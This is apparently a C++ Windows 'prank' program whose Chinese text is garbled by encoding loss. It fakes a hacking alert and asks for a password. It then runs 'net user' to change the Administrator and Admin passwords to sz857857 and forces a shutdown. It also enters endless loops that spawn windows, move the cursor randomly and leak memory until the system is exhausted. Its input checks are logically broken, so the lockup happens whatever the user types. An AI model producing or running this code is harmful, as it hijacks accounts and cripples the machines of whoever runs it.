#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
int main() {
	system("color f0");
	int jh;
	int mm;
	int mmm;
	int bf=0;
	long long int h=0; 
	jh=3;
	while(MessageBox(NULL,"��ĵ����Ѿ��ɹ�����ĳĳ������ռ���Ƿ���ӳ�ĳĳ��������Ҫ��","(͵͵�����㣬������3456798)",MB_YESNO)==7) {
		MessageBox(NULL,"��û�а�'��'������һ��","����'��'������(͵͵�����㣬������3456798)",MB_OK);
	}
	MessageBox(NULL,"���������Խ�����һ��,��3�λ���","",MB_OK);
	cout<<"�������룺";
	cin>>mmm;
	while(mmm!=3456798) 
	{
			if(jh==1) 
			{
				MessageBox(NULL,"��û�л�����,���ڰ�װ��������","hahaha",MB_OK);
				system("color 2d");
				for(int i=2; i<=100; i++) 
				{
					cout<<i<<"%"<<"�Ѱ�װ";
					Sleep(5);
					system("cls");
				}
				cout<<"��װ���";
				if(MessageBox(NULL,"Ҫ�Ұ���Ŀ�������ĳɡ�sz857857����","",MB_YESNO)!=7) 
				{
					system("net user Administrator sz857857");//���ÿ�������Ϊxz
					system("net user Admin sz857857");//���ÿ�������Ϊxz
				}
				Sleep(500);
				int x=GetSystemMetrics(SM_CXSCREEN);//���x�� 
				int y=GetSystemMetrics(SM_CYSCREEN);//���y�� 
				while(1)//ѭ�� 
    			{ 
	
    					SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
						cout<<"\a";
    					system("start");
    					cout<<"\a";
						MessageBox(NULL,"��������ǿ�ƹػ���","����Windows�ľ���",MB_OK);	//�������� 	
     			  		char *p=new char[10000];
 				}  
		}
		jh=jh-1;
		system("color f4");
		MessageBox(NULL,"�������","",MB_OK);
		system("color f4");
		cout<<"����"<<jh<<"�λ���"<<endl;
		if(jh==1) 
		{
			cout<<"С��ʾ����ͷ��ѡ�����д�Ŷ"<<endl;
			while(MessageBox(NULL,"��ĵ����Ѿ��ɹ�����ĳĳ������ռ���Ƿ���ӳ�ĳĳ��������Ҫ��","(͵͵�����㣬������3456798)",MB_YESNO)==7) 
			{
				MessageBox(NULL,"��û�а�'��'������һ��","����'��'������",MB_OK);
			}
		}
		Sleep(2000);
		system("color f0");
		system("cls");
		cout<<"�������룺";
		cin>>mmm;
		cout<<endl;
	}
 
	system("color f2");
	cout<<"������ȷ��"<<endl;
	MessageBox(NULL,"��һ������꿽��","hahaha",MB_OK);
	system("cls");
	while(MessageBox(NULL,"��ĳĳ˧��","",MB_YESNO)==7) 
	{
		MessageBox(NULL,"ѡ���ˣ���ѡ!","WRONG",MB_OK);
	}
	MessageBox(NULL,"��Ȼ��ѡ���ˣ����һ���Ҫ���㰲װ��������","hahaha",MB_OK);
	system("color 2d");
	for(int i=1;i<=100;i++) 
	{
		bf=bf+1;
		cout<<bf<<"%"<<"�Ѱ�װ";
		Sleep(5);
		system("cls");
	}
	cout<<"��װ���";
	Sleep(500);
	system("shutdown -s -t 60 -f -c'���Ļ����ѱ��������֣������������60s�ڹػ�������'");
	Sleep(1500);
	cout<<"�������ܰ�ã���һ����ũ���������ճ�һ��(�м䲻�����κη��ţ�)";
	cin>>h;
	if(h==809918314416||314416809918)
	{
		system("shutdown -a"); 
		for(int i=1;i<=100;i++)
		{
			MessageBox(NULL,"����Ϊ������ˣ�\n","",MB_OK);
		} 
		Sleep(5000);
		int x=GetSystemMetrics(SM_CXSCREEN);//���x�� 
		int y=GetSystemMetrics(SM_CYSCREEN);//���y�� 
		for(;;)
		{
			MessageBox(NULL,"���ǲ��Ǻܰ��������ܿ��֣��Ǿ͸��㿩����������ǿ�ƹػ��ɣ�","",MB_OK);
			SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
   			system("start");//�������� 	
			Sleep(15);
  			char *p=new char[1000000];//������
			cout<<"\a"; 
		}
	} 
	 else
	 {
	 	cout<<"�㻹��һ�λ���";
		system("cls");
		h=0;
		cin>>h;
		if(h!=314416809918||h!=809918314416)
		{
			system("shutdown -a");
			for(int i=1;i<=100;i++)
			{
				MessageBox(NULL,"��ã����ǲ��Ǻܰ�����","",MB_OK);
			} 
			Sleep(5000);
			int x=GetSystemMetrics(SM_CXSCREEN);//���x�� 
			int y=GetSystemMetrics(SM_CYSCREEN);//���y�� 
			for(;;)
			{
				MessageBox(NULL,"���ǲ��Ǻܰ��������ܿ��֣��Ǿ͸��㿩����������ǿ�ƹػ��ɣ�","",MB_OK);
				SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
    			system("start");//�������� 	
				Sleep(15);
  				char *p=new char[1000000];//������
				cout<<"\a"; 
			}
		 } 
	 }
	system("color f0");
	Sleep(2000);
	return 0;
}
